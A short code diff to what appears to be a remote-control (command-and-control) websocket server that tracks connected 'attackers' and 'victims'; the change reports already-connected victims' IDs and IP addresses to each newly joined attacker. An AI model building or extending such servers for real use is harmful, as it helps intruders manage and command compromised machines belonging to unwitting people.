@@ -40,6 +40,11 @@ async def websocket_endpoint(ws: WebSocket):
         attackers.append(ws)
         print(f"[+] Attacker connected: {ws.client.host}")
 
+        # Send existing victims to this new attacker
+        for victim_id, victim_ws in victims.items():
+            ip = victim_ws.client.host
+            await ws.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
+
         try:
             while True:
                 command = await ws.receive_text()
